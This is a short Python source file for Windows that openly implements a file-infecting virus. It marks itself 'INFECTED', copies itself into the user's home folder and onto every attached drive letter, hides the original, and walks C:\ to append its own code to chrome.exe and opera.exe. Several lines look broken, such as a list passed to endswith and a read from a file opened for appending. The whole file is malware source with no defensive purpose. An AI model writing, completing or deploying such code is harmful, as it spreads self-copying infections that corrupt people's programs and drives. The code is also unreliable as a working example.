import shutil
import os
import sys
import getpass
import win32con
import win32api

status = 'INFECTED'


drives = ['A:\\', 'B:\\', 'D:\\', 'E:\\', 'F:\\', 'G:\\', 'H:\\', 'I:\\',
          'J:\\', 'K:\\', 'L:\\', 'M:\\', 'N:\\', 'O:\\', 'P:\\', 'Q:\\',
          'R:\\', 'S:\\', 'T:\\', 'U:\\', 'V:\\', 'W:\\', 'X:\\', 'Y:\\',
          'Z:\\']


def spread():
    usr = getpass.getuser()
    new_path = 'C:/Users/' + usr
    name = sys.argv[0]
    path = os.getcwd()
    abspath = os.path.join(path, name)

    if os.path.isdir(new_path):
        if name not in new_path:
            try:
                shutil.copyfile(abspath, new_path)
            except Exception:
                pass
            else:
                win32api.SetFileAttributes(abspath, win32con.FILE_ATTRIBUTE_HIDDEN)

    for drive in drives:
        if os.path.isdir(drive):
            try:
                shutil.copyfile(abspath, drive)
            except Exception:
                pass
        else:
            pass


def virus_property():
    # Infect files in current user
    target = ['chrome.exe', 'opera.exe']
    path = 'C:\\'
    for r, d, files in os.walk(path):
        for file in files:
            if file.endswith(target):
                try:
                    with open(file, 'ab+') as g:
                        line = g.read()
                        if status not in line:
                            g.seek(0, 0)
                            with open(sys.argv[0], 'rb+') as c:
                                line = c.read()
                                g.write('\n' + line)
                                g.close()
                                c.close()
                                os.chmod(file, 0o777)
                        else:
                            pass
                except Exception:
                    pass
        break
